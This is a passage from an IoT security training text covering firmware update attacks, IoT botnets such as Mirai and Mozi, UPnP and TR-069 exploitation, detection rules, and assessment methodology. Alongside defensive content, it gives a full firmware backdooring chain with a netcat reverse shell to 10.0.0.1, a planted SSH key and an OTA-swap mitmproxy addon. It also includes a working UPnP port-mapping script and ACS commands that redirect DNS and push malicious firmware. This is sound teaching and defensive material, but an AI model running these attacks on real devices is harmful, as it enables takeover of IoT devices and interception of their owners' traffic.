  -postScript FindDangerousFunctions.java -deleteProject

# Batch analysis — iterate all ELF binaries, auto-detect architecture
find extracted/ -type f -exec file {} \; | grep "ELF" | cut -d: -f1 | while read bin; do
    arch=$(readelf -h "$bin" 2>/dev/null | grep "Machine:" | awk '{print $2}')
    case "$arch" in
        MIPS) proc="MIPS:LE:32:default" ;; ARM) proc="ARM:LE:32:v7" ;;
        *) proc="x86:LE:64:default" ;;
    esac
    $GHIDRA_HOME/support/analyzeHeadless /tmp/ghidra_projects BatchAnalysis \
        -import "$bin" -processor "$proc" \
        -postScript ExportFunctionList.java -noanalysis -overwrite
done
```

---

## 3. Firmware update security

### 3.1 Unsigned firmware exploitation

If the device does not verify a cryptographic signature on the firmware image before flashing, the attacker can: modify the firmware (add a backdoor, a reverse shell, a cryptocurrency miner, disable authentication), and serve the modified firmware to the device.

**Complete attack chain — unsigned firmware modification:**

```bash
# Step 1: Download or extract the original firmware
wget http://vendor.com/firmware/device_v1.2.bin -O original.bin

# Step 2: Extract the filesystem
binwalk -e original.bin
cd _original.bin.extracted/

# Step 3: Find and extract the squashfs filesystem
unsquashfs -d rootfs/ *.squashfs

# Step 4: Modify the filesystem
# Example: Add a reverse shell to rc.local (runs on boot)
echo '#!/bin/sh' > rootfs/etc/rc.local
echo '/bin/busybox nc 10.0.0.1 4444 -e /bin/sh &' >> rootfs/etc/rc.local
chmod +x rootfs/etc/rc.local

# Example: Add SSH public key for persistent access
mkdir -p rootfs/root/.ssh
echo 'ssh-ed25519 AAAA... attacker@host' > rootfs/root/.ssh/authorized_keys
chmod 600 rootfs/root/.ssh/authorized_keys

# Example: Disable authentication on the web interface
# (modify the httpd binary or its configuration to skip auth checks)
sed -i 's/admin_check()/return 1/' rootfs/usr/lib/lua/auth.lua

# Step 5: Repack the filesystem
mksquashfs rootfs/ modified.squashfs -comp xz -b 262144

# Step 6: Rebuild the firmware image
# Replace the original squashfs section in the firmware with the modified one
# Recalculate any CRC32/MD5 checksums in the header (vendor-specific format)
python3 rebuild_firmware.py original.bin modified.squashfs -o backdoored.bin

# Step 7: Serve the modified firmware to the device (see §3.2 for OTA MitM)
```

### 3.2 OTA MitM attack

**Intercepting and replacing OTA updates with mitmproxy:**

```bash
# Transparent proxy with mitmproxy (ARP spoof target or control gateway)
mitmproxy --mode transparent --listen-port 8080 -s firmware_replace.py

# firmware_replace.py — mitmproxy addon that swaps firmware downloads:
# from mitmproxy import http; import os
# class FirmwareReplacer:
#     def response(self, flow: http.HTTPFlow):
#         if "firmware" in flow.request.url and flow.request.url.endswith(".bin"):
#             with open("/path/to/backdoored.bin", "rb") as f:
#                 flow.response.content = f.read()
#             flow.response.headers["content-length"] = str(len(flow.response.content))
# addons = [FirmwareReplacer()]

# DNS redirect — resolve vendor update domain to attacker
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 10.0.0.1
echo "address=/updates.vendor.com/10.0.0.1" >> /etc/dnsmasq.conf
systemctl restart dnsmasq

# Serve backdoored firmware
python3 -m http.server 80 --directory /path/to/serve/
```

If the device uses HTTPS but does not validate the server certificate (common in low-cost IoT — many use a libcurl build without certificate verification, or an expired/self-signed CA bundle), the mitmproxy transparent mode with its own CA certificate can intercept the HTTPS connection.

### 3.3 Firmware signing implementation

A secure firmware signing process using OpenSSL and verification on the device:

```bash
# Key generation (vendor-side, offline HSM recommended)
openssl ecparam -genkey -name prime256v1 -out firmware_signing_key.pem
openssl ec -in firmware_signing_key.pem -pubout -out firmware_verify_key.pem

# Sign the firmware image
openssl dgst -sha256 -sign firmware_signing_key.pem \
  -out firmware.sig firmware.bin

# Create a signed firmware package (image + signature)
cat firmware.bin firmware.sig > firmware_signed.pkg
# Or use a structured format: [4-byte sig length][signature][firmware image]

# Verification on the device (in the bootloader or update agent):
openssl dgst -sha256 -verify /etc/firmware_verify_key.pem \
  -signature firmware.sig firmware.bin
# Returns "Verified OK" or "Verification Failure"
```

In production, the public verification key is embedded in the bootloader (burned into flash during manufacturing) or stored in a secure element. The private signing key never leaves the vendor's HSM (Hardware Security Module). Key rotation requires a firmware update signed by the old key that includes the new public key — this bootstrap problem is why some vendors maintain a root signing key (long-lived, in offline HSM) and per-release signing keys (shorter-lived, in online HSM), where the root key signs the per-release public keys.

### 3.4 Anti-rollback implementations

**Qualcomm:** The Qualcomm Secure Boot 3.0 uses anti-rollback counters stored in QFPROM (Qualcomm Fuse Region). Each firmware image includes a minimum rollback version; the bootloader compares against the fused counter. The counter is stored across multiple fuse rows with ECC. The `sectools` utility handles fuse programming during manufacturing.

**NXP HAB (High Assurance Boot):** i.MX series SoCs use HAB with monotonic counters in OCOTP (On-Chip OTP). The SRK (Super Root Key) hash is fused into OCOTP. The bootloader verifies the firmware signature chain against the fused SRK hash. The anti-rollback counter in OCOTP prevents downgrade. HAB configuration is via CST (Code Signing Tool):

```bash
# NXP CST — sign a firmware image with HAB
./cst --o image_signed.bin --i csf.txt
# csf.txt specifies: SRK table, signing key, anti-rollback version, image regions to sign
```

**STM32 Secure Boot with anti-rollback:** STM32 devices can use the write protection on option bytes combined with RDP to prevent unauthorized modification of the bootloader, which enforces version checks. The STM32 Secure Boot (SBSFU — Secure Boot and Secure Firmware Update) reference implementation includes a version check in the bootloader that rejects firmware with a version number less than or equal to the installed version, stored in a protected flash region.

### 3.5 Downgrade attacks

Even if the current firmware is patched, the attacker can flash an older, vulnerable version. If the device (or its bootloader) does not enforce a minimum firmware version (anti-rollback protection), the downgrade succeeds. The attacker then exploits the known vulnerability in the old firmware.

**Anti-rollback mechanisms.** Monotonic version counter in OTP (One-Time Programmable) fuses: each firmware update increments a counter burned into the chip's fuses. The bootloader reads the fuse counter and rejects firmware with a version number lower than the fuse value. The fuse is irreversible (once burned, the counter cannot be decremented). ARM's Trusted Board Boot (TBB) and many SoC vendors (Qualcomm, MediaTek, NXP) support this mechanism.

### 3.6 TOCTOU on OTA

A TOCTOU (Time-of-Check-Time-of-Use) attack on the update process: the bootloader verifies the firmware image's signature, then reads the firmware for execution. If the attacker can modify the firmware between the verification and the execution (e.g., by swapping the eMMC content or by modifying the flash between the two reads — Domain 17 §4.5), the bootloader executes unverified code.

### 3.7 Secure OTA architectures

A secure OTA system provides: **transport security** (TLS with certificate pinning to the update server — preventing MitM), **image signing** (the firmware image is signed by the vendor's private key; the device verifies the signature with the vendor's public key embedded in the bootloader or a secure element — preventing modification), **anti-rollback** (the device rejects firmware versions older than the current version — preventing downgrade), **atomic update** (the device maintains two firmware slots, A and B; the new firmware is written to the inactive slot, verified, then the bootloader switches to it; if the new firmware fails to boot, the device automatically reverts to the previous slot — preventing bricking), and **integrity reporting** (the device reports its current firmware version and hash to the cloud backend, enabling the vendor to detect devices running compromised firmware).

Frameworks: **SWUpdate** (open-source, Linux-based, supports dual-copy and signed updates), **Mender** (open-source, OTA update manager with delta updates and rollback), **hawkBit** (Eclipse, device management and update orchestration).

---

## 4. IoT botnets — comprehensive

### 4.1 Mirai — architecture and evolution

**Original Mirai (2016, by "Anna-senpai"/Paras Jha, Josiah White, Dalton Norman).** Architecture:

**Scanner.** Each infected device scans random IP addresses on TCP port 23 (Telnet) and port 2323 (alternative Telnet). When a connection is established, the scanner tries 62 hardcoded username/password pairs (root/root, admin/admin, root/vizxv, root/xc3511, admin/1234, etc. — covering a wide range of DVRs, cameras, routers, and other IoT devices). Successful logins are reported to a central **Report Server** (via TCP on a custom port).

**Loader.** The Report Server dispatches the loader, which: connects to the victim device (using the stolen credentials), determines the device's CPU architecture (by attempting to execute architecture-specific `echo` commands — MIPS, MIPSEL, ARM, ARM7, x86, x86_64, SH4, PPC, SPARC, M68K), downloads the appropriate Mirai bot binary (from a distribution server), and executes it. The bot binary is statically-compiled (no dependency on the device's libraries).

**Bot.** Once running, the bot: kills competing malware (scanning for processes listening on known botnet ports and killing them, or killing processes by name — targeting other IoT malware families), closes the Telnet port (preventing reinfection by competitors and preventing the device owner from using Telnet), connects to the CnC (Command and Control) server (hardcoded domain name, resolved via DNS), receives DDoS commands (SYN flood, ACK flood, UDP flood, DNS amplification, GRE flood, HTTP GET/POST flood), and continues scanning (each bot is also a scanner, creating exponential growth).

**Mirai source code analysis — key functions:**

The Mirai source (released on Hackforums, September 2016) is organized into `bot/`, `loader/`, `cnc/`, and `tools/` directories. Key functions in the bot module:

`scanner_init()` in `bot/scanner.c`: initializes the scanning thread. Creates a raw TCP socket for SYN scanning (does not complete the TCP handshake for initial port probing — sends SYN, waits for SYN-ACK, then sends the RST). This is stealthier than a full connect() scan. The function generates random IP addresses, excluding reserved ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, and the Department of Defense ranges) — an intentional evasion of monitoring in high-profile network spaces.

`scanner_kill()` in `bot/killer.c`: the anti-competitor module. Scans `/proc/` for processes, reads `/proc/<pid>/cmdline` and `/proc/<pid>/maps`, and kills processes matching known botnet signatures. Also kills processes listening on ports 22 (SSH — some competing botnets open SSH for management), 23 (Telnet), and 80 (some bots run a web server for C2). After killing competitors, it binds to port 48101 to mark the device as "owned."

`attack_init()` in `bot/attack.c`: dispatches DDoS attack methods. Each attack type is a separate function: `attack_udp_generic()`, `attack_udp_vse()` (Valve Source Engine query flood), `attack_udp_dns()` (DNS amplification), `attack_tcp_syn()`, `attack_tcp_ack()`, `attack_tcp_stomp()` (ACK flood with established connections), `attack_gre_ip()`, `attack_gre_eth()`, `attack_app_http()`. The C2 server selects the attack type, target IP range, duration, and attack-specific parameters (packet size, flag combination, target port).

`resolv_lookup()` in `bot/resolv.c`: performs DNS resolution for the C2 domain. Uses raw DNS packets (does not use the system's resolver) to avoid logging. The C2 domain is XOR-encoded in the binary with a single-byte key (trivially reversible — this is obfuscation, not encryption).

**The Dyn DNS attack (October 21, 2016).** Mirai launched a massive DDoS attack against Dyn's DNS infrastructure in three waves. The first wave at approximately 11:10 UTC targeted Dyn's East Coast DNS servers. The second wave at 15:50 UTC was a broader attack. The third wave at 17:00 UTC was partially mitigated. Because Dyn provided DNS services for major websites (Twitter, Netflix, Reddit, Spotify, GitHub, PayPal, etc.), the DNS disruption made these services unreachable for hours across the US East Coast and intermittently worldwide. The estimated botnet size during the attack was 100,000–150,000 compromised IoT devices (primarily DVRs and IP cameras manufactured by XiongMai Technology and Dahua). The peak traffic volume was estimated at 1.2 Tbps.

**OVH attack (September 2016).** The preceding attack against OVH (French hosting provider) peaked at 1.1 Tbps, the largest DDoS attack recorded at that time. The attack targeted OVH customer servers, including Minecraft servers — Mirai's original purpose was Minecraft server DDoS-for-hire.

**Liberia attack (November 2016).** A Mirai variant targeted Lonestar Cell MTN, Liberia's largest telecom provider, generating enough traffic to degrade internet access for the entire country — demonstrating that IoT botnets could effectively DDoS a nation-state's connectivity.

**Source-code release.** In September 2016, the Mirai source code was released on Hackforums (by "Anna-senpai"), spawning dozens of variants. Notable variants: **Satori** (targeted Huawei router CVE-2017-17215 for propagation — shifting from default credentials to CVE exploitation), **Okiru/Satori** (targeted ARC-architecture IoT devices), **Masuta** (used the Mirai codebase with additional CVE exploits), **IoT Reaper/IoTroop** (a Mirai variant with a CVE exploitation framework — see §4.5), **Mirai Go** (rewritten in Go for easier cross-compilation), and **Mirai Rust** (rewritten in Rust for memory safety and evasion of signature-based detection trained on C-compiled Mirai binaries).

### 4.2 Mirai detection rules

**Sigma rule for Telnet brute-force detection:**

```yaml
title: IoT Botnet Telnet Brute-Force Pattern
id: e7a2c1f0-b3d4-4e5f-a6c8-9d0e1f2a3b4c
status: stable
description: Detects rapid Telnet connection attempts from single source — Mirai scanner pattern
logsource:
    category: firewall
    product: any
references:
    - https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/antonakakis
date: 2025/01/15
tags:
    - attack.credential_access
    - attack.t1110.001
    - attack.discovery
detection:
    selection:
        dst_port: 23
        action: allow
    timeframe: 60s
    condition: selection | count(src_ip) by dst_ip > 10
    # More than 10 Telnet connections from different sources to the same destination
    # within 60 seconds indicates scanning activity
falsepositives:
    - Legitimate network scanning by security teams
    - IoT device provisioning systems
level: high
```

**Suricata rules for Mirai C2 traffic:**

```
# Mirai bot-to-CnC registration (bot sends architecture identifier)
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"MALWARE Mirai Bot CnC Registration";
    flow:established,to_server;
    content:"|00 00 00 01|";
    offset:0; depth:4;
    content:"|00 00|";
    within:2;
    threshold: type both, track by_src, count 1, seconds 60;
    classtype:trojan-activity;
    sid:2025001; rev:1;
)

# Mirai CnC attack command (server sends target IP, attack type, duration)
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"MALWARE Mirai CnC Attack Command";
    flow:established,to_client;
    content:"|00 00 00|";
    offset:0; depth:3;
    byte_test:1,>,0,3;
    byte_test:1,<,11,3;
    # Attack type byte (0x00-0x0A) at offset 3
    threshold: type both, track by_dst, count 1, seconds 300;
    classtype:trojan-activity;
    sid:2025002; rev:1;
)

# Mirai scanner SYN flood with specific TCP options fingerprint
alert tcp $HOME_NET any -> $EXTERNAL_NET 23 (
    msg:"MALWARE Mirai Scanner Telnet SYN";
    flags:S;
    window:14600;
    threshold: type both, track by_src, count 50, seconds 10;
    classtype:trojan-activity;
    sid:2025003; rev:1;
)
```

**Network-level IoT botnet detection patterns:**

DNS-based detection is highly effective because IoT botnets rely on DNS for C2 resolution. Monitor for: sudden DNS resolution of previously-unseen domains from IoT VLANs (IoT devices should resolve a small, predictable set of domains — the cloud backend, NTP servers, and the update server). DGA (Domain Generation Algorithm) detection: Mirai variants using DGA produce domains with high entropy and no natural-language structure — statistical analysis of DNS query streams can flag these. Fast-flux detection: C2 domains with rapidly-changing A records (TTL < 300 seconds, multiple A records cycling) indicate bulletproof hosting typical of botnet infrastructure.

Traffic volume anomaly detection: an IoT camera that normally generates 2 Mbps of video traffic suddenly pushing 50 Mbps of UDP traffic is an unmistakable indicator of DDoS participation. NetFlow/IPFIX analysis at the network edge can flag devices whose traffic profile deviates from their baseline.

### 4.3 Honeypot deployment for IoT botnet intelligence

**Cowrie — Telnet/SSH honeypot:**

```bash
git clone https://github.com/cowrie/cowrie.git && cd cowrie
python3 -m venv cowrie-env && source cowrie-env/bin/activate && pip install -r requirements.txt
# Configure etc/cowrie.cfg: enable telnet on port 2323, enable JSON logging
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
bin/cowrie start
# Captures: credentials, post-login commands, downloaded payloads (var/lib/cowrie/downloads/)
```

**Dionaea** — broader protocol honeypot (SMB, HTTP, FTP, TFTP, SIP, MQTT, UPnP):

```bash
docker run -d --name dionaea \
  -p 21:21 -p 23:23 -p 80:80 -p 443:443 -p 445:445 -p 1883:1883 -p 5060:5060 \
  dinotools/dionaea
# Payloads captured in /opt/dionaea/var/lib/dionaea/binaries/
```

### 4.4 IoT botnet C2 protocol analysis

**Mirai C2 protocol:** A custom binary protocol over TCP. The bot connects to the C2 server on a hardcoded port (typically 23 or a high port). The initial handshake: the bot sends a 4-byte registration packet (architecture identifier). The C2 responds with an acknowledgment. Attack commands are fixed-length packets: 4 bytes (target IP count), followed by target IP/CIDR pairs, 1 byte (attack type — 0 through 10 for different DDoS methods), 1 byte (attack flags), 2 bytes (duration in seconds), and attack-specific parameters (port, payload content). The protocol has no encryption or authentication — anyone who reverse-engineers the C2 address can connect and issue commands (this is how security researchers have hijacked Mirai botnets).

**Mozi DHT-based C2:** Mozi (2019–2021) uses the BitTorrent DHT protocol (BEP 5) for C2 communication. Commands are distributed as DHT values associated with specific info_hash keys. The bot periodically performs DHT `get_peers` lookups for its command info_hash. New commands are propagated as DHT `announce_peer` messages. This P2P architecture has no single point of failure — there is no C2 server to take down. Disruption requires injecting poisoned DHT entries or controlling a majority of the DHT nodes in the botnet's hash space (Sybil attack on the DHT). Mozi propagated via Telnet default credentials and CVEs (Netgear, D-Link, Huawei HG532 CVE-2017-17215, GPON router CVE-2018-10561). Its persistence mechanisms (modified `/etc/init.d/` scripts and crontab), competitor blocking (iptables rules blocking ports used by rival botnets), and self-patching (closing the vulnerability it used for entry) made it exceptionally resilient. In September 2021, Chinese law enforcement arrested the Mozi operators and distributed a kill-switch command via the Mozi DHT, instructing all bots to self-delete — leveraging the botnet's own P2P update mechanism for takedown.

### 4.5 Hajime, Reaper/IoTroop, and newer botnets

**Hajime (2016–present).** Propagates via the same Telnet/default-credential vector as Mirai but uses a BitTorrent DHT-based P2P C2 (no centralized CnC server). After infection, it blocks ports 23 (Telnet), 7547 (TR-069), 5555 (ADB), and 5358 — ostensibly "protecting" the device. Hajime has no DDoS payload; its stated purpose is benign. However, the P2P C2 could be weaponized at any time, the device owner never consented, and Hajime consumes resources and modifies configuration.

**Reaper/IoTroop (2017).** Moved beyond default-credential scanning to exploiting specific CVEs: D-Link DIR-600/645 (CVE-2013-1599 — UPnP SOAP command injection), GoAhead web server (CVE-2017-8225 — buffer overflow), Netgear DGN1000/DGN2200 (command injection), Linksys E1500/E2500 (CVE-2013-3307 — HNAP auth bypass), AVTECH IP cameras (search.cgi command injection), and Vacron NVR (board.cgi command injection). Reaper's modular exploit framework accepted new CVE exploits as Lua scripts, making it extensible without recompilation — an evolution from brute-force to vulnerability-driven propagation.

**Dark Nexus (2020).** Advanced Mirai variant with a scoring system for device "value" (architecture, bandwidth, CPU), modular DDoS types including browser-based L7 attacks, and dynamic credential lists updated via C2. **Enemybot (2022).** Combines Mirai's scanner with Gafgyt's DDoS modules and CVE exploits targeting VMware (CVE-2022-22954), F5 BIG-IP (CVE-2022-1388), and Spring4Shell (CVE-2022-22963) — demonstrating IoT botnet scope expansion into enterprise infrastructure.

### 4.6 Botnet takedown methodology

Sinkholing: register or seize the C2 domain(s) and point them to a researcher-controlled sinkhole server. All bots connect to the sinkhole, neutralizing attack capability. The sinkhole enumerates botnet size and geographic distribution by logging connections. Legal coordination with domain registrars and law enforcement (FBI, Europol EC3) is required.

Kill switch deployment: as demonstrated by the Mozi takedown — when the C2 protocol includes a software update mechanism, law enforcement can leverage it to distribute a shutdown command. This requires obtaining the operator's signing key (through arrest or seizure) to authenticate the kill command to the bots.

### 4.7 IoT botnet defense

**Network segmentation:** Isolate IoT devices on a dedicated VLAN with strict egress filtering. Allow only the minimum required outbound connections (cloud backend, NTP, DNS). Block all outbound Telnet (23), SSH (22), and alternative Telnet (2323) from the IoT VLAN. Use application-layer firewalls to restrict traffic to known-good API patterns.

**Credential management:** Change default credentials on all IoT devices during deployment. Use unique per-device credentials. Disable Telnet and enable SSH with key-based authentication where possible. For devices that cannot change credentials, isolate behind a firewall blocking inbound management ports from the internet.

**Automated patching:** Deploy an IoT device management platform (AWS IoT Device Management, Azure IoT Hub, or open-source hawkBit) for firmware updates. Monitor vendor security advisories. For EOL devices, plan replacement or compensating controls (network isolation, IPS rules).

**ISP-level filtering:** NetFlow analysis, DDoS detection (Arbor, Radware), and BCP38/BCP84 source address validation prevent spoofed-source DDoS. Proactive scanning of ISP IP space for open-Telnet/default-credential devices enables customer notification.

---

## 5. UPnP, SSDP, and TR-069

### 5.1 UPnP exploitation

**IGD (Internet Gateway Device) port mapping.** UPnP IGD allows devices on the LAN to request the router to open NAT port mappings (forwarding external ports to internal IP:port). The UPnP API (`AddPortMapping`, `DeletePortMapping`) has no authentication — any device (or malware) on the LAN can: open ports on the router (exposing internal services to the internet), redirect ports (forwarding external traffic to the attacker's device — enabling MitM or traffic interception), and delete existing port mappings (DoS for legitimate applications that use UPnP, such as gaming consoles and media servers).

**Miranda — UPnP discovery and exploitation tool:**

```bash
git clone https://github.com/isaacfife/miranda.git && cd miranda && python3 miranda.py

upnp> msearch                                    # discover UPnP devices
upnp> host list                                  # [0] 192.168.1.1:49152 (IGD)
upnp> host get 0                                 # enumerate services
upnp> host info 0 WANIPConnection controlActions # list available actions
upnp> host send 0 WANIPConnection AddPortMapping # add port forward
  # NewExternalPort: 4444, NewProtocol: TCP, NewInternalPort: 22
  # NewInternalClient: 192.168.1.100, NewEnabled: 1, NewLeaseDuration: 0
upnp> host send 0 WANIPConnection GetGenericPortMappingEntry  # list all mappings
```

**UPnP IGD exploitation — Python script for AddPortMapping:**

```python
"""UPnP IGD exploitation — add arbitrary port mapping. Authorized assessment only."""
import requests, xml.etree.ElementTree as ET

ROUTER_IP, UPNP_PORT = "192.168.1.1", 49152  # port discovered via SSDP/Miranda

# Fetch device description and parse WANIPConnection control URL
resp = requests.get(f"http://{ROUTER_IP}:{UPNP_PORT}/rootDesc.xml", timeout=5)
root = ET.fromstring(resp.text)
control_url = None
for svc in root.iter("{urn:schemas-upnp-org:device-1-0}service"):
    st = svc.find("{urn:schemas-upnp-org:device-1-0}serviceType")
    if st is not None and "WANIPConnection" in st.text:
        control_url = svc.find("{urn:schemas-upnp-org:device-1-0}controlURL").text
        break
if not control_url:
    raise RuntimeError("WANIPConnection service not found")

soap_body = """<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
  s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>4444</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>22</NewInternalPort>
      <NewInternalClient>192.168.1.100</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>test</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>"""

r = requests.post(
    f"http://{ROUTER_IP}:{UPNP_PORT}{control_url}", data=soap_body,
    headers={"Content-Type": "text/xml; charset=utf-8",
             "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"},
    timeout=5)
print(f"Status: {r.status_code}\n{r.text}")
```

**SSDP amplification attack mechanics and mitigation:**

SSDP uses UDP multicast (239.255.255.250:1900). An attacker sends M-SEARCH requests with the victim's spoofed source IP to UPnP devices. The M-SEARCH request is ~90 bytes; responses reach 2000+ bytes (device description XML, service URLs), yielding 20–30x amplification. At scale, 1 Gbps of attacker upload generates 20–30 Gbps directed at the victim. Mitigation: disable UPnP on WAN interfaces, filter SSDP (UDP 1900) at ISP edge (no legitimate cross-boundary use), implement BCP38 source address validation.

**libupnp vulnerabilities.** CVE-2012-5958 through CVE-2012-5965: stack-based buffer overflows in `unique_service_name()` — a crafted SSDP M-SEARCH response with a long USN field enables RCE on any device running unpatched libupnp (Intel SDK for UPnP Devices). Millions of devices affected (routers, cameras, NAS, media players); many remain unpatched due to vendor EOL.

### 5.2 TR-069/CWMP exploitation

**Architecture.** TR-069 defines communication between a CPE (Customer Premises Equipment — router, modem, set-top box) and an ACS (Auto-Configuration Server, operated by the ISP). The CPE initiates an HTTP/HTTPS session to the ACS (the ACS URL is configured in the CPE's management interface or provisioned during manufacturing). The ACS sends RPC (Remote Procedure Call) commands to the CPE:

`Inform`: the CPE sends its status to the ACS (device model, serial number, firmware version, WAN IP, provisioning state). `GetParameterValues`: the ACS reads configuration parameters from the CPE (Wi-Fi SSID, DNS servers, port-forwarding rules). `SetParameterValues`: the ACS writes configuration parameters (change DNS servers, modify Wi-Fi password, enable/disable services). `Download`: the ACS instructs the CPE to download a file (firmware update, configuration file) from a specified URL. `Reboot`: the ACS reboots the CPE. `FactoryReset`: the ACS resets the CPE to factory defaults.

**TR-069 exploitation — custom ACS for testing with GenieACS:**

```bash
npm install -g genieacs
genieacs-cwmp --port 7547 &  # CWMP endpoint
genieacs-nbi --port 7557 &  # REST API
genieacs-fs --port 7567 &   # file server
genieacs-ui --port 3000 &   # web UI
# Point CPE ACS URL to http://<attacker>:7547 (via DHCP option 43, DNS redirect, or CSRF)

# Read all parameters
curl -X POST http://localhost:7557/devices/<id>/tasks -H "Content-Type: application/json" \
  -d '{"name":"getParameterValues","parameterNames":["InternetGatewayDevice."]}'

# Redirect DNS to attacker
curl -X POST http://localhost:7557/devices/<id>/tasks -H "Content-Type: application/json" \
  -d '{"name":"setParameterValues","parameterValues":[
    ["InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DNSServers","10.0.0.1"]]}'

# Push malicious firmware
curl -X POST http://localhost:7557/devices/<id>/tasks -H "Content-Type: application/json" \
  -d '{"name":"download","file":"backdoored_firmware.bin"}'
```

**TR-069 exploitation vectors:** An attacker who compromises or impersonates the ACS (via DNS hijacking or CSRF to change the CPE's ACS URL) can: push malicious firmware (`Download` RPC), redirect DNS (`SetParameterValues` for DNS servers — phishing/malware distribution at scale), extract Wi-Fi/VoIP/PPPoE credentials (`GetParameterValues`), and disable security features.

**Real CVEs:** CVE-2014-9222 (Misfortune Cookie — §2.7) enabled unauthenticated admin access on millions of RomPager gateways, including TR-069 ACS URL modification. D-Link: CVE-2019-17621 (DIR-859 UPnP M-SEARCH command injection), CVE-2018-6530 (DIR-860L SOAP command injection), CVE-2020-25078 (DCS cameras — admin password in plaintext at `/config/getuser`).

**Mass exploitation (2014).** The TheMoon botnet exploited TR-064 (LAN-side UPnP management, related to TR-069) on D-Link, Zyxel, and Huawei routers, modifying DNS settings on ~12 million devices worldwide to redirect queries to attacker-controlled servers. A single exploitable bug in widely-deployed CPE firmware affects millions of ISP-managed devices.

**Defense:** Disable UPnP on consumer routers (both WAN and LAN sides if not needed). For TR-069: enforce mutual TLS between CPE and ACS (the CPE authenticates the ACS with a pinned certificate, and the ACS authenticates the CPE with a client certificate provisioned during manufacturing). Restrict CWMP (port 7547) access with ACLs — only the ISP's ACS IP ranges should be permitted. Disable TR-069 entirely if the device is not ISP-managed. Monitor for unauthorized ACS URL changes in the CPE configuration.

---

## 6. IoT security assessment methodology

A structured IoT security assessment covers the hardware layer, firmware layer, network layer, and cloud backend. The methodology below provides a repeatable framework for each.

### 6.1 Hardware assessment checklist

The hardware assessment phase identifies and exploits physical debug interfaces. The following checklist drives the assessment:

**Interface discovery:** Open the device enclosure. Photograph the PCB (top and bottom). Identify all ICs (read markings, cross-reference with datasheets). Identify all test points, headers, and unpopulated pads. Map all connectors (USB, Ethernet, antenna, power). Specifically look for: UART headers (4-pin, near SoC), JTAG/SWD headers (10-pin ARM standard, 20-pin legacy, or unpopulated pads near SoC debug pins), SPI flash chips (SOIC-8 packages near SoC — read markings for Winbond, Macronix, Spansion, Micron), I²C EEPROMs (SOIC-8 or SOT-23 packages — read markings for Microchip 24Cxx, ATMEL AT24Cxx), and eMMC/NAND (BGA packages — requires advanced extraction techniques).

**Extraction priority:** UART first (fastest to connect, often gives a root shell). SPI flash second (full firmware dump without needing a shell). JTAG/SWD third (most powerful but requires pin identification and SoC-specific configuration). I²C/EEPROM last (usually contains configuration data, not full firmware).

**Tools required:** Multimeter, logic analyzer (Saleae Logic 8 minimum), USB-to-UART adapters (3.3V and 1.8V), SOIC-8 test clip, JTAGulator (or manual probing with OpenOCD), Raspberry Pi (for SPI/I²C extraction), Bus Pirate (backup for SPI/I²C), soldering equipment (for desoldering flash chips if in-circuit reading fails).

### 6.2 Firmware assessment checklist

**Static analysis:** Acquire firmware (§2.1). Run `binwalk -e` to extract. Run `binwalk -E` for entropy analysis (identify encrypted sections). Extract filesystem with appropriate tool (§2.2). Run firmwalker for automated credential discovery. Run EMBA for comprehensive automated analysis. Run `cve-bin-tool` against extracted binaries. Manually analyze high-value targets in Ghidra (web server, management daemons, authentication code). Search for hardcoded credentials, backdoor accounts, debug endpoints.

**Dynamic analysis:** Emulate firmware with firmadyne or QEMU. Scan the emulated device with `nmap` to identify open services. Fuzz network services with `boofuzz` or `AFL`. Test the web interface for OWASP Top 10 (injection, authentication bypass, CSRF, directory traversal). Capture network traffic from the emulated device to identify cloud-backend communication patterns.

### 6.3 Network assessment

**Protocol analysis:** Capture network traffic from the device during normal operation (initial setup, periodic cloud sync, firmware update check, user interaction). Identify all communication endpoints (cloud APIs, NTP servers, DNS resolvers, update servers). Verify TLS usage and certificate validation (attempt MitM with mitmproxy — if the device accepts a self-signed certificate, TLS validation is broken). Analyze the device-to-cloud API for authentication weaknesses (static tokens, predictable session IDs, missing authorization checks). Test for MQTT/CoAP/AMQP protocol-specific issues (covered in Chapter 28A).

**Cloud backend testing:** Enumerate the cloud API (from firmware analysis, mobile app decompilation, or traffic capture). Test for IDOR (Insecure Direct Object Reference — can device A access device B's data by changing an ID in the API request). Test for mass assignment (can the API request include fields that should be server-controlled, like device ownership or firmware version). Test for broken authentication (can a device authenticate with another device's credentials or a forged token).

### 6.4 Automated IoT security tools

**RouterSploit — exploitation framework for embedded devices:**

```bash
# Install RouterSploit
git clone https://github.com/threat9/routersploit.git
cd routersploit
pip install -r requirements.txt

# Run RouterSploit
python3 rsf.py

# Scan a target device for known vulnerabilities
rsf> use scanners/autopwn
rsf> set target 192.168.1.1
rsf> run
# Automatically tests all applicable exploits against the target

# Use a specific exploit
rsf> use exploits/routers/dlink/dir_300_600_rce
rsf> set target 192.168.1.1
rsf> run

# Credential brute-force
rsf> use creds/generic/telnet_bruteforce
rsf> set target 192.168.1.1
rsf> run
```

**IoTSeeker — default credential scanner:**

```bash
# IoTSeeker (Rapid7) scans for IoT devices with default credentials
git clone https://github.com/rapid7/IoTSeeker.git
cd IoTSeeker
python3 iotseeker.py -t 192.168.1.0/24
# Scans the network for known IoT devices and attempts default credential login
# Supports: cameras (Axis, Hikvision, Dahua), routers (TP-Link, Netgear, D-Link),
# NAS (QNAP, Synology), printers (HP, Brother), and others.
```

**firmwalker — firmware filesystem analysis:**

```bash
# Run firmwalker on an extracted firmware filesystem
git clone https://github.com/craigz28/firmwalker.git
cd firmwalker
./firmwalker.sh /path/to/extracted/filesystem/
